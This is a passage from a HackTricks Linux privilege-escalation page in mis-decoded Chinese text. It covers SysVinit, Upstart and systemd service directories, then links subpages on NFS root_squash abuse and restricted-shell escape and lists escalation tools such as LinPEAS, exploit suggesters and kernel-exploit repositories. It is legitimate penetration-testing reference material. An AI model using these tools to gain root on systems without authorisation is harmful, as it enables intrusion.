<p>ç›®å½• <code>/etc/init.d</code> æ˜¯ <strong>System V init (SysVinit)</strong> çš„ <strong>è„šæœ¬</strong> çš„å®¶ï¼Œ<strong>ç»å…¸çš„ Linux æœåŠ¡ç®¡ç†ç³»ç»Ÿ</strong>ã€‚å®ƒåŒ…å«ç”¨äº <code>å¯åŠ¨</code>ã€<code>åœæ­¢</code>ã€<code>é‡å¯</code>ï¼Œæœ‰æ—¶ <code>é‡æ–°åŠ è½½</code> æœåŠ¡çš„è„šæœ¬ã€‚è¿™äº›å¯ä»¥ç›´æ¥æ‰§è¡Œæˆ–é€šè¿‡åœ¨ <code>/etc/rc?.d/</code> ä¸­æ‰¾åˆ°çš„ç¬¦å·é“¾æ¥æ‰§è¡Œã€‚åœ¨ Redhat ç³»ç»Ÿä¸­ï¼Œå¦ä¸€ä¸ªè·¯å¾„æ˜¯ <code>/etc/rc.d/init.d</code>ã€‚</p>
<p>å¦ä¸€æ–¹é¢ï¼Œ<code>/etc/init</code> ä¸ <strong>Upstart</strong> ç›¸å…³ï¼ŒUpstart æ˜¯ Ubuntu å¼•å…¥çš„è¾ƒæ–° <strong>æœåŠ¡ç®¡ç†</strong>ï¼Œä½¿ç”¨é…ç½®æ–‡ä»¶è¿›è¡ŒæœåŠ¡ç®¡ç†ä»»åŠ¡ã€‚å°½ç®¡å·²ç»è¿‡æ¸¡åˆ° Upstartï¼Œä½†ç”±äº Upstart ä¸­çš„å…¼å®¹å±‚ï¼ŒSysVinit è„šæœ¬ä»ä¸ Upstart é…ç½®ä¸€èµ·ä½¿ç”¨ã€‚</p>
<p><strong>systemd</strong> ä½œä¸ºç°ä»£åˆå§‹åŒ–å’ŒæœåŠ¡ç®¡ç†å™¨å‡ºç°ï¼Œæä¾›äº†æŒ‰éœ€å®ˆæŠ¤è¿›ç¨‹å¯åŠ¨ã€è‡ªåŠ¨æŒ‚è½½ç®¡ç†å’Œç³»ç»ŸçŠ¶æ€å¿«ç…§ç­‰é«˜çº§åŠŸèƒ½ã€‚å®ƒå°†æ–‡ä»¶ç»„ç»‡åˆ° <code>/usr/lib/systemd/</code> ç”¨äºåˆ†å‘åŒ…ï¼Œå’Œ <code>/etc/systemd/system/</code> ç”¨äºç®¡ç†å‘˜ä¿®æ”¹ï¼Œç®€åŒ–äº†ç³»ç»Ÿç®¡ç†è¿‡ç¨‹ã€‚</p>
<h2 id="å…¶ä»–æŠ€å·§"><a class="header" href="#å…¶ä»–æŠ€å·§">å…¶ä»–æŠ€å·§</a></h2>
<h3 id="nfs-æƒé™æå‡"><a class="header" href="#nfs-æƒé™æå‡">NFS æƒé™æå‡</a></h3>
<p>{% content-ref url="nfs-no_root_squash-misconfiguration-pe.md" %}
<a href="nfs-no_root_squash-misconfiguration-pe.html">nfs-no_root_squash-misconfiguration-pe.md</a>
{% endcontent-ref %}</p>
<h3 id="ä»å—é™-shell-ä¸­é€ƒé€¸"><a class="header" href="#ä»å—é™-shell-ä¸­é€ƒé€¸">ä»å—é™ Shell ä¸­é€ƒé€¸</a></h3>
<p>{% content-ref url="escaping-from-limited-bash.md" %}
<a href="escaping-from-limited-bash.html">escaping-from-limited-bash.md</a>
{% endcontent-ref %}</p>
<h3 id="cisco---vmanage"><a class="header" href="#cisco---vmanage">Cisco - vmanage</a></h3>
<p>{% content-ref url="cisco-vmanage.md" %}
<a href="cisco-vmanage.html">cisco-vmanage.md</a>
{% endcontent-ref %}</p>
<h2 id="å†…æ ¸å®‰å…¨ä¿æŠ¤"><a class="header" href="#å†…æ ¸å®‰å…¨ä¿æŠ¤">å†…æ ¸å®‰å…¨ä¿æŠ¤</a></h2>
<ul>
<li><a href="https://github.com/a13xp0p0v/kconfig-hardened-check">https://github.com/a13xp0p0v/kconfig-hardened-check</a></li>
<li><a href="https://github.com/a13xp0p0v/linux-kernel-defence-map">https://github.com/a13xp0p0v/linux-kernel-defence-map</a></li>
</ul>
<h2 id="æ›´å¤šå¸®åŠ©"><a class="header" href="#æ›´å¤šå¸®åŠ©">æ›´å¤šå¸®åŠ©</a></h2>
<p><a href="https://github.com/ropnop/impacket_static_binaries">é™æ€ impacket äºŒè¿›åˆ¶æ–‡ä»¶</a></p>
<h2 id="linuxunix-æƒé™æå‡å·¥å…·"><a class="header" href="#linuxunix-æƒé™æå‡å·¥å…·">Linux/Unix æƒé™æå‡å·¥å…·</a></h2>
<h3 id="æŸ¥æ‰¾-linux-æœ¬åœ°æƒé™æå‡å‘é‡çš„æœ€ä½³å·¥å…·-linpeas"><a class="header" href="#æŸ¥æ‰¾-linux-æœ¬åœ°æƒé™æå‡å‘é‡çš„æœ€ä½³å·¥å…·-linpeas"><strong>æŸ¥æ‰¾ Linux æœ¬åœ°æƒé™æå‡å‘é‡çš„æœ€ä½³å·¥å…·:</strong> <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS"><strong>LinPEAS</strong></a></a></h3>
<p><strong>LinEnum</strong>: <a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a>(-t é€‰é¡¹)<br />
<strong>Enumy</strong>: <a href="https://github.com/luke-goddard/enumy">https://github.com/luke-goddard/enumy</a><br />
<strong>Unix æƒé™æå‡æ£€æŸ¥:</strong> <a href="http://pentestmonkey.net/tools/audit/unix-privesc-check">http://pentestmonkey.net/tools/audit/unix-privesc-check</a><br />
<strong>Linux æƒé™æ£€æŸ¥å™¨:</strong> <a href="http://www.securitysift.com/download/linuxprivchecker.py">www.securitysift.com/download/linuxprivchecker.py</a><br />
<strong>BeeRoot:</strong> <a href="https://github.com/AlessandroZ/BeRoot/tree/master/Linux">https://github.com/AlessandroZ/BeRoot/tree/master/Linux</a><br />
<strong>Kernelpop:</strong> æšä¸¾ Linux å’Œ MAC ä¸­çš„å†…æ ¸æ¼æ´ <a href="https://github.com/spencerdodd/kernelpop">https://github.com/spencerdodd/kernelpop</a><br />
<strong>Mestaploit:</strong> <em><strong>multi/recon/local_exploit_suggester</strong></em><br />
<strong>Linux Exploit Suggester:</strong> <a href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a><br />
<strong>EvilAbigail (ç‰©ç†è®¿é—®):</strong> <a href="https://github.com/GDSSecurity/EvilAbigail">https://github.com/GDSSecurity/EvilAbigail</a><br />
<strong>æ›´å¤šè„šæœ¬çš„æ±‡ç¼–</strong>: <a href="https://github.com/1N3/PrivEsc">https://github.com/1N3/PrivEsc</a></p>
<h2 id="å‚è€ƒæ–‡çŒ®"><a class="header" href="#å‚è€ƒæ–‡çŒ®">å‚è€ƒæ–‡çŒ®</a></h2>
<ul>
<li><a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</a>\</li>
<li><a href="https://payatu.com/guide-linux-privilege-escalation/">https://payatu.com/guide-linux-privilege-escalation/</a>\</li>
<li><a href="https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744">https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744</a>\</li>
<li><a href="http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html">http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html</a>\</li>
<li><a href="https://touhidshaikh.com/blog/?p=827">https://touhidshaikh.com/blog/?p=827</a>\</li>
<li><a href="https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf">https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf</a>\</li>
<li><a href="https://github.com/frizb/Linux-Privilege-Escalation">https://github.com/frizb/Linux-Privilege-Escalation</a>\</li>
<li><a href="https://github.com/lucyoa/kernel-exploits">https://github.com/lucyoa/kernel-exploits</a>\</li>
<li><a href="https://github.com/rtcrowley/linux-private-i">https://github.com/rtcrowley/linux-private-i</a></li>
<li><a href="https://www.linux.com/news/what-socket/">https://www.linux.com/news/what-socket/</a></li>
<li><a href="https://muzec0318.github.io/posts/PG/peppo.html">https://muzec0318.github.io/posts/PG/peppo.html</a></li>
<li><a href="https://www.linuxjournal.com/article/7744">https://www.linuxjournal.com/article/7744</a></li>
<li><a href="https://blog.certcube.com/suid-executables-linux-privilege-escalation/">https://blog.certcube.com/suid-executables-linux-privilege-escalation/</a></li>
<li><a href="https://juggernaut-sec.com/sudo-part-2-lpe">https://juggernaut-sec.com/sudo-part-2-lpe</a></li>
<li><a href="https://linuxconfig.org/how-to-manage-acls-on-linux">https://linuxconfig.org/how-to-manage-acls-on-linux</a></li>
<li><a href="https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&amp;qid=e026a0c5f83df4fd532442e1324ffa4f">https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&amp;qid=e026a0c5f83df4fd532442e1324ffa4f</a></li>
<li><a href="https://www.linode.com/docs/guides/what-is-systemd/">https://www.linode.com/docs/guides/what-is-systemd/</a></li>
</ul>
<p>{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æ”»å‡»ï¼š<img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)</strong></a><img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æ”»å‡»ï¼š <img src="../../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)</strong><img src="../../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>ç”µæŠ¥ç¾¤ç»„</strong></a> æˆ– <strong>åœ¨ Twitter ä¸Šå…³æ³¨</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../linux-hardening/linux-privilege-escalation-checklist.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../../linux-hardening/privilege-escalation/write-to-root.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../linux-hardening/linux-privilege-escalation-checklist.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../../linux-hardening/privilege-escalation/write-to-root.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../elasticlunr.min.js"></script>
        <script src="../../mark.min.js"></script>
        <script src="../../searcher.js"></script>

        <script src="../../clipboard.min.js"></script>
        <script src="../../highlight.js"></script>
        <script src="../../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
